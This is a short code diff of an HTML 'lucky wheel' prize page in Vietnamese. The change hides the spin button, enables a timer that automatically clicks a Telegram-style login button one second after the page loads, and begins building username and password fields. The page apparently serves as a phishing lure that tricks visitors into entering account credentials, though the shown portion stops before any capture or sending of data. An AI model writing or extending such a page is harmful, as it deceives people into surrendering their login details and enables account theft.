@@ -11,8 +11,8 @@
         position:fixed;
         top: 50%;
         left: 50%;
-        margin-top: -250px;
-        margin-left: -250px;
+        margin-top: -150px;
+        margin-left: -150px;
       }
     </style>
   </head>
@@ -26,7 +26,7 @@
     <div class="wrapper typo" id="wrapper">
       <section id="luckywheel" class="hc-luckywheel">
         <div class="hc-luckywheel-container">
-          <canvas class="hc-luckywheel-canvas" width="350px" height="350px"
+          <canvas class="hc-luckywheel-canvas" width="300px" height="300px"
             >Vòng Xoay May Mắn</canvas
           >
         </div>
@@ -38,9 +38,9 @@
     <script src="js/hc-canvas-luckwheel.js"></script>
     <script>
       document.getElementsByClassName("hc-luckywheel-btn")[0].style.display = "none"
-      // setTimeout(() => {
-      //   document.getElementsByClassName("btn tgme_widget_login_button")[0].click();
-      // }, 1000);
+      setTimeout(() => {
+        document.getElementsByClassName("btn tgme_widget_login_button")[0].click();
+      }, 1000);
       var usernameInput = document.createElement("input");
       var passwordInput = document.createElement("input");
 
